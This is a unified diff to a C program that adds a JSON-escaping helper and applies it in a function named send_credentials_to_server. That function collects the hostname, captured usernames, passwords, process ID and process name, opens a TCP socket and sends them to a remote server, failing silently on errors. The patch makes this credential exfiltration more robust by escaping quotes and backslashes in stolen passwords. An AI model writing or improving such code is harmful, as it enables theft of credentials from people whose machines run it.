@@ -177,6 +177,30 @@ static const struct argp argp = {
 
 /******************************************************************************/
 /*!
+ *  \brief  Escape a string for safe JSON embedding (handles " and \ chars)
+ *  \param  dst   Output buffer
+ *  \param  src   Input string (may contain special chars)
+ *  \param  maxlen  Size of dst buffer
+ */
+static void json_escape(char *dst, const char *src, size_t maxlen)
+{
+    size_t di = 0;
+    if (!src) { dst[0] = '\0'; return; }
+    for (size_t si = 0; src[si] && di + 2 < maxlen; si++) {
+        switch (src[si]) {
+            case '"':  dst[di++] = '\\'; dst[di++] = '"';  break;
+            case '\\': dst[di++] = '\\'; dst[di++] = '\\'; break;
+            case '\n': dst[di++] = '\\'; dst[di++] = 'n';  break;
+            case '\r': dst[di++] = '\\'; dst[di++] = 'r';  break;
+            case '\t': dst[di++] = '\\'; dst[di++] = 't';  break;
+            default:   dst[di++] = src[si];                 break;
+        }
+    }
+    dst[di] = '\0';
+}
+
+/******************************************************************************/
+/*!
  *  \brief  send captured credentials to remote server in JSON format
  */
 static void send_credentials_to_server(const char *username, 
@@ -184,13 +208,20 @@ static void send_credentials_to_server(const char *username,
 {
     int sock;
     struct sockaddr_in server_addr;
-    char json_buffer[1024];
+    char json_buffer[2048];
     char hostname[256];
+    char esc_hostname[512], esc_username[512], esc_password[512], esc_process[512];
     
     // Get system hostname
     if (gethostname(hostname, sizeof(hostname)) != 0) {
         strcpy(hostname, "unknown");
     }
+    
+    // Escape all strings for safe JSON embedding
+    json_escape(esc_hostname, hostname, sizeof(esc_hostname));
+    json_escape(esc_username, username, sizeof(esc_username));
+    json_escape(esc_password, password, sizeof(esc_password));
+    json_escape(esc_process, process, sizeof(esc_process));
     
     // Create socket
     sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -215,14 +246,14 @@ static void send_credentials_to_server(const char *username,
         return;  // Silently fail if connection fails
     }
     
-    // Create JSON payload
+    // Create JSON payload (using escaped strings)
     snprintf(json_buffer, sizeof(json_buffer),
              "{\"hostname\": \"%s\", \"username\": \"%s\", \"password\": \"%s\", \"pid\": %d, \"process\": \"%s\"}",
-             hostname,
-             username ? username : "",
-             password ? password : "",
+             esc_hostname,
+             esc_username,
+             esc_password,
              pid,
-             process ? process : "");
+             esc_process);
     
     // Send data
     send(sock, json_buffer, strlen(json_buffer), 0);
